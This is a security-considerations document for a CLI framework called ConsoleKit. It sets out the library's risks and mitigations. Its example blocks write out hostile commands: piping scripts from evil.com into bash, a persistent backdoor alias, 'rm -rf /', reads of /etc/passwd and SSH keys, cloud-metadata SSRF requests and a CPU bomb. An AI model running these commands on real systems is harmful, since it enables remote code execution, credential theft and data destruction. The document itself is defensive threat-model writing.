# Security Considerations for ConsoleKit

This document outlines the security considerations when using the ConsoleKit library. ConsoleKit is designed as a powerful CLI/REPL framework that provides extensive system access capabilities. **It is intended for trusted environments and trusted users only.**

## ⚠️ Critical Security Notice

**ConsoleKit is NOT designed for multi-tenant environments, untrusted users, or production systems where command execution must be restricted.** The library provides intentional access to system resources and should be treated as having the same security implications as giving users shell access.

## Security Concerns

### 1. Unrestricted File System Access

**Issue**: Multiple commands provide unrestricted access to the file system with the same permissions as the running process.

**Affected Components**:
- `cat` command (misc.go:23): Can read any file accessible to the process
- `LoadScript` function (run.go:247): Can load and execute any external script file
- `@file` embedded script loading (run.go:234): Reads files from embedded filesystem

**Example**:
```bash
# User can read any file the process has access to
cat /etc/passwd
cat ~/.ssh/id_rsa
cat /var/log/sensitive.log

# Scripts can be loaded from anywhere
run /tmp/malicious-script.sh
```

**Impact**:
- Users can read sensitive files (credentials, keys, logs, config files)
- No path restrictions or sandboxing
- Process runs with full permissions of the application

**Mitigation Recommendations** (if needed for your use case):
- Run the application with minimal required permissions
- Use filesystem capabilities or chroot/jails to restrict access
- Implement path allowlisting in a wrapper layer
- Add file access logging/auditing
- Consider implementing a `--restrict-paths` flag that validates paths against an allowlist

### 2. Arbitrary OS Command Execution

**Issue**: The `osexec` command allows execution of arbitrary operating system commands with the application's permissions.

**Affected Components**:
- `osexec` command (exec.go:31): Executes arbitrary shell commands
- Background execution support (exec.go:42): Commands can run detached
- Output can be hidden (exec.go:33): Silent command execution

**Example**:
```bash
# Execute any command
osexec "rm -rf /important/data"
osexec "curl http://evil.com/malware.sh | bash"

# Background execution with hidden output
osexec --background --out "nohup malicious-process &"
```

**Impact**:
- Full command execution with process permissions
- Can spawn background processes that outlive the CLI session
- Can modify/delete files, install software, open network connections
- Equivalent to granting shell access

**Mitigation Recommendations** (if needed for your use case):
- Use command allowlisting instead of arbitrary execution
- Implement command approval/logging
- Use seccomp/AppArmor/SELinux profiles
- Run in containerized/sandboxed environment
- Consider removing `osexec` entirely if not needed

### 3. Token Replacement Command Injection

**Issue**: The `@exec:` token replacement executes commands and injects their output, enabling command injection chains.

**Affected Components**:
- Token replacement system (cli.go:119-130)
- `@exec:command` pattern

**Example**:
```bash
# Command injection through token replacement
set myvar "@exec:cat /etc/passwd"
print @myvar

# Chained execution
set payload "@exec:curl http://evil.com/script.sh"
osexec "@payload"
```

**Impact**:
- Arbitrary command execution through token injection
- Commands executed during token replacement phase
- Can be used to bypass validation in wrapped commands

**Mitigation Recommendations**:
- Disable `@exec:` token replacement if not needed
- Implement token replacement logging
- Validate/sanitize token values
- Add `--no-exec-tokens` flag to disable dynamic execution


### 5. Script Command Injection

**Issue**: Scripts can contain arbitrary commands and are executed without validation or sandboxing.

**Affected Components**:
- `run` command (run.go:88): Executes script files
- Script argument injection (run.go:67-69): Arguments passed as `@arg0`, `@arg1`, etc.

**Example**:
```bash
# Create malicious script
echo "osexec 'rm -rf /'" > /tmp/bad.sh

# Execute it
run /tmp/bad.sh

# Argument injection
run script.sh "; osexec malicious-command"
```

**Impact**:
- Scripts execute with full application permissions
- No script validation or signing
- Arguments can be used for injection attacks
- Scripts can read files, execute commands, access network

**Mitigation Recommendations**:
- Implement script signing/verification
- Validate script content before execution
- Run scripts in sandboxed environment
- Implement script allowlisting
- Add script audit logging

### 6. Infinite Loop and Recursion Attacks

**Status**: ✅ **MITIGATED** - Recursion depth tracking added (maxExecDepth = 10)

**Previous Issue**: Alias and token replacement could create infinite recursion loops leading to stack overflow or DoS.

**Mitigation Implemented**:
- Recursion depth counter in ExecuteLine (cli.go)
- Maximum depth limit of 10 levels
- Error returned when depth exceeded

**Example (now protected)**:
```bash
# This will now fail after 10 levels instead of crashing
set a "@exec:print @b"
set b "@exec:print @a"
print @a  # Error: maximum execution depth exceeded
```

### 7. HTTP Request Forgery (SSRF)

**Issue**: The `http` command can make arbitrary HTTP requests, potentially accessing internal services.

**Status**: ⚠️ **PARTIALLY MITIGATED** - Timeout added (30 seconds), but SSRF risk remains

**Affected Components**:
- `http` command (base.go:90)
- FetchURLContent function (base.go:385)

**Example**:
```bash
# Access internal services
http http://localhost:6379/  # Access internal Redis
http http://169.254.169.254/latest/meta-data/  # AWS metadata
http http://internal-admin-panel/
```

**Impact**:
- Can probe internal network services
- Access cloud metadata endpoints
- Potential for information disclosure
- Port scanning capabilities

**Mitigation Recommendations**:
- Implement URL allowlisting
- Block private IP ranges (RFC 1918, link-local, etc.)
- Block cloud metadata endpoints
- Add request logging
- Implement rate limiting

### 8. History File Information Disclosure

**Issue**: Command history is stored in plaintext in the user's home directory.

**Affected Components**:
- History file: `~/.{appname}.history`
- History management (cli.go:268-307)

**Impact**:
- Passwords/secrets entered in commands are stored in plaintext
- History readable by anyone with access to user's home directory
- History persists after session ends

**Example**:
```bash
# These commands are saved in history in plaintext
http https://api.example.com/?token=secret123
osexec "mysql -u root -pSuperSecretPassword"
```

**Mitigation Recommendations**:
- Set restrictive permissions on history file (0600)
- Implement history filtering for sensitive patterns
- Add `--no-history` flag for sensitive commands
- Consider encrypting history file
- Add history retention policies

### 9. Alias File Persistence

**Issue**: Aliases are stored in `~/.{appname}.aliases` and loaded automatically, enabling persistence attacks.

**Affected Components**:
- Alias file: `~/.{appname}.aliases`
- LoadAliases function (alias.go:141)

**Impact**:
- Malicious aliases can persist across sessions
- Aliases execute automatically when loaded
- No integrity checking or signing

**Example**:
```bash
# Malicious alias added to file
echo 'ls=osexec "curl http://evil.com/backdoor.sh | bash"' >> ~/.myapp.aliases
```

**Mitigation Recommendations**:
- Implement alias file signing/verification
- Set restrictive permissions on alias file (0600)
- Add alias validation on load
- Implement alias allowlisting
- Log alias execution

### 10. Background Process Management

**Issue**: Background processes can be started but there's no tracking or management of spawned processes.

**Affected Components**:
- `osexec --background` (exec.go:42)
- `run --spawn` (run.go:122)
- `spawn` command (run.go:143)

**Impact**:
- Orphaned processes continue running after CLI exits
- No way to list or kill background processes
- Resource exhaustion possible
- Processes run with full permissions

**Example**:
```bash
# Start multiple background processes with no tracking
osexec --background "while true; do :; done"  # CPU bomb
run --spawn infinite-script.sh
spawn "repeat --count -1 --sleep 1 'print spam'"
```

**Mitigation Recommendations**:
- Implement process tracking registry
- Add commands to list/kill background processes
- Implement process limits (max count, CPU, memory)
- Register cleanup handlers (signal handling)
- Consider using process groups for management

## Deployment Recommendations

### For Development/Internal Tools (Current Design Intent)
- **✅ Acceptable**: Local development tools, internal automation, trusted user environments
- **Considerations**: Still use minimal permissions, separate user accounts

### For Production/Multi-User Environments (NOT RECOMMENDED)
If you must deploy in less-trusted environments, implement:

1. **Sandboxing**:
   - Run in Docker/containers with resource limits
   - Use seccomp/AppArmor/SELinux profiles
   - Implement filesystem restrictions

2. **Authentication & Authorization**:
   - Implement user authentication
   - Role-based command access control
   - Audit logging of all commands

3. **Command Restrictions**:
   - Disable `osexec` completely
   - Implement command allowlisting
   - Remove file system access commands if not needed

4. **Network Restrictions**:
   - Firewall rules to block SSRF targets
   - URL allowlisting for `http` command
   - Rate limiting

5. **Monitoring**:
   - Centralized logging
   - Anomaly detection
   - Alert on suspicious patterns

## Threat Model Summary

**Trusted User**: ConsoleKit assumes all users are trusted and authorized to perform any action the process can perform.

**Equivalent to Shell Access**: Providing access to a ConsoleKit-based CLI is equivalent to providing shell access with the same permissions as the running process.

**Not Suitable For**:
- Web-facing applications
- Multi-tenant systems
- Untrusted user environments
- Systems requiring command restrictions
- Compliance-restricted environments (without extensive hardening)

**Suitable For**:
- Local development tools
- Internal automation scripts
- Trusted administrator consoles
- Single-user applications
- Prototyping and testing

## Reporting Security Issues

If you discover security vulnerabilities in ConsoleKit itself (not the documented limitations), please report them responsibly to the project maintainers.

## Version History

- **Current Version**: Security documentation added; recursion protection implemented
- **Previous Version**: No security controls; infinite recursion possible

---

**Remember**: Security is a shared responsibility. Understanding these limitations and implementing appropriate controls for your specific use case is essential for safe deployment of ConsoleKit-based applications.
